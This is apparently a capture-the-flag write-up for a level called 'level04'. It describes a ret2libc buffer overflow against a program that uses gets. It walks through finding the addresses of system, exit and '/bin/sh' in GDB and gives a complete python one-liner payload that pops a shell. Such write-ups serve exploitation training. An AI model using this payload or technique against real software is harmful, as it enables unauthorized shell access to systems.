## Help level04

In this exercice it will be special.
when we rune the code we have "Give me some shellcode, k", when we disas the code we saw that we are in a child process and there is a gets.
if we try to break it we saw it stop at 156 so we can exploit this.

But we will not do a shellcode for this one, we will use the address of system exit and /bin/sh to get a shell.

We will use GDB to get their address, start by system :
with info function system we get 0xf7e6aed0, then transform it for the print \xd0\xae\xe6\xf7

then we do the same for exit 0xf7e5eb70 -> \x70\xeb\xe5\xf7

and then, how to obtain /bin/sh :
this time the command is info proc map

With the address printed we can saw the libc start and end, so we need to get the string using those address to be sure it's in the libc
find 0xf7e2c000,0xf7fcc000,"/bin/sh" : 0xf7f897ec -> \xec\x97\xf8\xf7

Now with the 3 address we can finish the command who will be

```
(python -c 'print "\x90"*156+"\xd0\xae\xe6\xf7"+"\x70\xeb\xe5\xf7"+"\xec\x97\xf8\xf7"'; cat) | ./level04
```

Congrat, we have a shell to get the flag now !
